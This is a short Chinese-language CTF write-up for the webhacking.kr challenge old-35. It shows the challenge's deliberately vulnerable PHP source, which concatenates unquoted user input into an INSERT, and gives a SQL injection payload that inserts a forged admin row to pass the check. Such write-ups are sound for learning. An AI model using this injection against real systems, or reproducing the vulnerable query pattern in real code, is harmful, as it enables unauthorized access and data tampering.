# old-35_350

* 一進到這一個網站，直接看他的 source code
    ```php=
    $db = dbconnect();
    if($_GET['phone'] && $_GET['id']){
      if(preg_match("/\*|\/|=|select|-|#|;/i",$_GET['phone'])) exit("no hack");
      if(strlen($_GET['id']) > 5) exit("no hack");
      if(preg_match("/admin/i",$_GET['id'])) exit("you are not admin");
      mysqli_query($db,"insert into chall35(id,ip,phone) values('{$_GET['id']}','{$_SERVER['REMOTE_ADDR']}',{$_GET['phone']})") or die("query error");
      echo "Done<br>";
    }

    $isAdmin = mysqli_fetch_array(mysqli_query($db,"select ip from chall35 where id='admin' and ip='{$_SERVER['REMOTE_ADDR']}'"));
    if($isAdmin['ip'] == $_SERVER['REMOTE_ADDR']){
      solve(35);
      mysqli_query($db,"delete from chall35");
    }

    $phone_list = mysqli_query($db,"select * from chall35 where ip='{$_SERVER['REMOTE_ADDR']}'");
    echo "<!--\n";
    while($r = mysqli_fetch_array($phone_list)){
      echo htmlentities($r['id'])." - ".$r['phone']."\n";
    }
    echo "-->\n";
    ```
    明顯考的是 sql injection
* 只要達成 isAdmin 的條件就可以過了
* 注入點是 phone，因為其他的限制比較多
* `insert into chall35(id,ip,phone) values('{$_GET['id']}','{$_SERVER['REMOTE_ADDR']}',{$_GET['phone']})`
    能改的地方只有 phone 其他的都是預設值，所以只要 insert. 複數的 data 到 database 裡面就可以了
* 至於 insert 複數的 data 的方法可以參考 old-08_350 裡面的內容
* 所以我就想到了一個 payload `1),('admin', 'your_ip_address', 2`
* 把它放到句子裡面看看 
    ```sql=
    insert into chall35(id,ip,phone) values('{$_GET['id']}','{$_SERVER['REMOTE_ADDR']}',1),('admin', 'your_ip_address', 2)
    ```
    完美
* 送出之後就過拉
